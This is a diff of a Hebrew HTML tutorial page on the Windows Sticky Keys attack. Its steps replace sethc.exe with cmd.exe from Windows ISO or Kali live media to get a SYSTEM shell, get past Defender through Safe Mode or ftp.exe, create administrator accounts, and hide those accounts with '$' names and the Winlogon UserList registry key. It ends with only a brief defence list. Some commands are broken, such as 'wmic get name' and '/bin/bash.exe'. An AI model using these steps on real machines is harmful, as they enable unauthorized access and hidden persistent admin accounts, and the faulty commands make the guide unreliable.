@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>מדריך למתקפה על Windows עם שינוי סדר אתחול</title>
+  <title>Sticky Keys Attack & Hiding Users Guide</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -51,73 +51,111 @@
 </head>
 <body>
 
-<h1>מדריך למתקפה על Windows עם שינוי סדר אתחול ושימוש ב-Mimikatz</h1>
+<h1>מדריך מתקפת Sticky Keys והסתרת משתמשים</h1>
 
-<p>במדריך הזה, אציג את הדרך בה אפשר להשתמש במערכת הפעלה חיצונית (כגון Kali Linux) כדי לבצע התקפה על מחשב Windows, לשנות את סדר האתחול, להפעיל את ה-Command Prompt ולבצע מתקפות כמו שינוי הרשאות, שליפת סיסמאות ונתונים, והגנה מפני תוקפים.</p>
+<h2>איך מבצעים את מתקפת Sticky Keys?</h2>
+<p>עובדים עם דיסק מערכת חלופי (כגון Windows ISO או Kali Live):</p>
 
-<h2>התחלת המתקפה - שינוי סדר אתחול:</h2>
-<p>1. תחילה עלינו לשנות את סדר האתחול במחשב כדי לאתחל את המחשב בעזרת מערכת הפעלה חדשה.</p>
-<p>2. נכנס למצב "תיקון המחשב" דרך מסך אתחול (Boot) כדי להיכנס ל-“Troubleshoot” ואז לבחור ב-“Advanced Options”.</p>
-<p>3. בחר ב-“Command Prompt” ונמצא את עצמנו ב-“Rescue Shell”.</p>
+<h3>Windows ISO:</h3>
+<ol>
+<li>שנה את סדר האתחול לטעינה מה-ISO.</li>
+<li>בחר "תקן את המחשב שלך".</li>
+<li>גש ל-"פתרון בעיות" (Troubleshoot) ואז "אפשרויות מתקדמות" → "שורת פקודה" (Command Prompt).</li>
+<li>לרשימת הדיסקים:
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>wmic get name</pre></li>
+<li>בחר דיסק (למשל D:), נווט ל:
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>D:\Windows\System32</pre></li>
+<li>בצע גיבוי ושנה קובץ גישה (כגון sethc.exe או osk.exe):
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>copy sethc.exe sethc.bak
+copy cmd.exe sethc.exe</pre></li>
+<li>לאתחול מחדש:
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>shutdown /r /f /t 0</pre></li>
+<li>לחיצה על Shift לחמש פעמים תפתח את ה-CMD בהרשאות SYSTEM.</li>
+</ol>
 
-<h2>בדיקת דיסקים במערכת:</h2>
-<p>נשתמש בפקודת <code>wmic get name</code> או <code>wmic opticaldisk get name</code> כדי לראות את הדיסקים שמחוברים למחשב:</p>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>wmic get name</pre>
-
-<h2>שינוי קבצים ב-System32:</h2>
-<p>כעת, נעבור לנתיב <code>\windows\system32</code> כדי לשנות את הקובץ <code>sethc.exe</code> (שמשמש עבור Sticky Keys) או קובץ אחר כמו <code>osk.exe</code> כדי להחליפם ב-<code>cmd.exe</code> או <code>ftp.exe</code>.</p>
-<p>פקודה לדוגמה:</p>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>copy sethc.exe cmd.exe</pre>
-
-<p>אם המערכת משבשת את הפעולה, נוכל לשנות את הקובץ דרך <code>ftp.exe</code>:</p>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>!cmd</pre>
-
-<h2>שימוש במצב Safe Mode:</h2>
-<p>אם ה-Defender חוסם את הפעולה, אפשר להפעיל את המחשב במצב "Safe Mode" (ללא הגנות):</p>
+<h3>בעיה - Windows Defender חוסם את ההחלפה:</h3>
+<p>דרכים לעקיפה:</p>
+<ul>
+<li>להחליף במקום זאת קובץ FTP.exe ואז להיכנס ל-CMD דרך:
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>!cmd</pre></li>
+<li>להיכנס למצב Safe Mode (שמנטרל את ה-Defender):
 <pre><button class="copy-btn" onclick="copyText(this)">העתק</button>bcdedit /set {default} safeboot minimal</pre>
-<p>לאחר מכן השתמש בפקודת <code>shutdown</code> כדי לאתחל את המחשב מחדש:</p>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>shutdown /f /r /t 0</pre>
-
-<h2>הגדרת משתמשים והרשאות:</h2>
-<p>1. <strong>יצירת משתמש חדש:</strong> כדי להוסיף משתמש חדש עם סיסמא:</p>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>net user new_username Pa$$w0rd /add</pre>
-
-<p>2. <strong>שינוי הרשאות:</strong> להפוך את המשתמש החדש לאדמיניסטרטור:</p>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>net localgroup administrators new_username /add</pre>
-
-<p>3. <strong>הסתרת משתמשים:</strong> נוכל להסתיר משתמשים דרך "Registry Editor" ולהגביל את הצגת המשתמשים במסך ההתחברות.</p>
-
-<h2>שימוש ב-Kali Linux (במערכת חי):</h2>
-<p>1. <strong>הפעלת Kali Linux:</strong> אם נשנה את סדר האתחול, נוכל להפעיל את Kali Linux ולהיכנס לדיסק של Windows.</p>
-<p>2. <strong>התקנת את הדיסק של Windows:</strong> השתמש בפקודות:</p>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>fdisk -l</pre>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>mount /dev/sda2 /mnt</pre>
-
-<p>3. <strong>העתקת הקבצים ב-System32:</strong> ננווט לנתיב <code>\windows\system32</code> ונבצע את ההעתקה מחדש:</p>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>cp sethc.exe cmd.exe</pre>
-
-<p>4. <strong>הסנכרון והפסקת חיבור:</strong> סנכרן את השינויים והפסק את החיבור:</p>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>sync</pre>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>umount /mnt</pre>
-
-<h2>הגנה מפני התקפות Sticky Keys:</h2>
-<p>כדי להגן על המחשב, ניתן לנקוט בכמה פעולות:</p>
-<ul>
-  <li><strong>סיסמת BIOS:</strong> אם נשמור סיסמה ב-BIOS, אף אחד לא יוכל לשנות את סדר האתחול.</li>
-  <li><strong>הצפנה עם BitLocker:</strong> הצפנת הכונן תמנע גישה למידע אם המחשב יאבד.</li>
-  <li><strong>גישה מוגבלת:</strong> הגבלת גישה פיזית למחשב על ידי נעילת חדרים או שימוש באבטחה נוספת.</li>
+אתחול מחדש:
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>shutdown /r /f /t 0</pre>
+חזרה למצב רגיל:
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>bcdedit /deletevalue {default} safeboot</pre>
+</li>
 </ul>
 
-<h2>סיכום:</h2>
-<p>במדריך הזה, למדנו כיצד:</p>
+<h3>Kali Linux Live:</h3>
+<ol>
+<li>שנה את סדר האתחול לטעינה מ-Kali Live.</li>
+<li>פתח טרמינל.</li>
+<li>רשום:
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>fdisk -l</pre></li>
+<li>הרכב את הדיסק:
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>mount /dev/sda2 /mnt</pre></li>
+<li>נווט ל:
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>cd /mnt/Windows/System32</pre></li>
+<li>שמור עותק ושנה קובץ:
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>cp sethc.exe sethc.bak
+cp /bin/bash.exe sethc.exe</pre></li>
+<li>סנכרון וניתוק:
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>sync
+umount /mnt</pre></li>
+</ol>
+
+<h2>איך להגן מפני מתקפת Sticky Keys?</h2>
 <ul>
-  <li>לשנות את סדר האתחול במחשב כדי להפעיל מערכת הפעלה חיצונית.</li>
-  <li>לעקוף את הגבלות ה-Defender של Windows.</li>
-  <li>ליצור משתמשים ולהעלות את הרשאותיהם.</li>
-  <li>לשלוף סיסמאות והאשינגים מהזיכרון של Windows.</li>
-  <li>לעבוד עם Kali Linux כדי לגשת למערכת.</li>
-  <li>להגן על עצמך מפני התקפות Sticky Keys.</li>
+<li>הגדר סיסמת BIOS (אך הסרה של סוללת CMOS תאפס אותה).</li>
+<li>הצפן את הדיסק (למשל BitLocker).</li>
+<li>מנע גישה פיזית למחשב.</li>
+<li>Windows Defender ATP עוצר ניסיון החלפת קבצים.</li>
 </ul>
+
+<hr>
+
+<h2>איך להסתיר משתמשים ב-Windows?</h2>
+
+<h3>להסתיר משתמש מפקודת net user:</h3>
+<p>צריך להוסיף סימן $ לשם המשתמש.</p>
+
+שינוי שם למשתמש קיים:
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>wmic useraccount where name="שםמשתמש" call rename name="שםמשתמש$"</pre>
+
+<h3>להסתיר משתמש ממסך הכניסה (Winlogon):</h3>
+<p>צריך לערוך את הרג'יסטרי:</p>
+<ol>
+<li>פתח את עורך הרג'יסטרי (regedit).</li>
+<li>גש לכתובת:
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList</pre></li>
+<li>אם התיקיות לא קיימות - צור אותן.</li>
+<li>צור ערך חדש מסוג DWORD (32bit), בשם שם המשתמש.</li>
+<li>קבע את הערך ל-0.</li>
+</ol>
+
+<h3>טבלת סיכום:</h3>
+<table border="1" style="border-collapse: collapse;">
+<thead>
+<tr><th>מה עשינו</th><th>איך</th></tr>
+</thead>
+<tbody>
+<tr><td>הסתרת משתמש מ-net user</td><td>הוספת $ לשם</td></tr>
+<tr><td>הסתרת משתמש ממסך התחברות</td><td>יצירת ערך ב-Registry תחת UserList</td></tr>
+</tbody>
+</table>
+
+<hr>
+
+<h2>ניהול משתמשים מתקדם:</h2>
+
+| פעולה | פקודה |
+|:---|:---|
+| צפייה בכל המשתמשים | `net user` |
+| יצירת משתמש חדש | `net user username Pa$$w0rd /add` |
+| שינוי סיסמה למשתמש | `net user username newPa$$word` |
+| הוספת משתמש לקבוצת מנהלים | `net localgroup administrators username /add` |
+| צפייה במשתמשים בקבוצה | `net localgroup groupname` |
 
 <script>
 function copyText(button) {
